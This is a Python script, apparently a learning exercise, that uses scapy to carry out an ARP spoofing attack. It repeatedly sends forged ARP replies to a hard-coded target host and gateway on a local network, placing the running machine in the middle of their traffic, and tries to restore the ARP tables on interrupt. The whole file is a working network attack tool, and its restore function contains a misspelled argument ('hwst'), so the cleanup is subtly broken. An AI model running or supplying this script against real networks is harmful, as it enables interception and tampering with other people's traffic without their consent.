#!/usr/bin/env python

import optparse
import time
import sys
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answerd_list, _ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    return answerd_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # pdst=target_isd, hwdst=target_mac, psrc=router_ip
    packet = scapy.ARP(op=2, pdst=target_ip,  hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "192.168.11.24"
gateway_id = "192.168.11.1"
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_id)
        spoof(gateway_id, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), flush=True, end="")
        # sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+]  Detected CTRL + C ........ Resetting ARP tables .......... Please wait.\n")
    restore(target_ip, gateway_id)
    restore(gateway_id, target_ip)
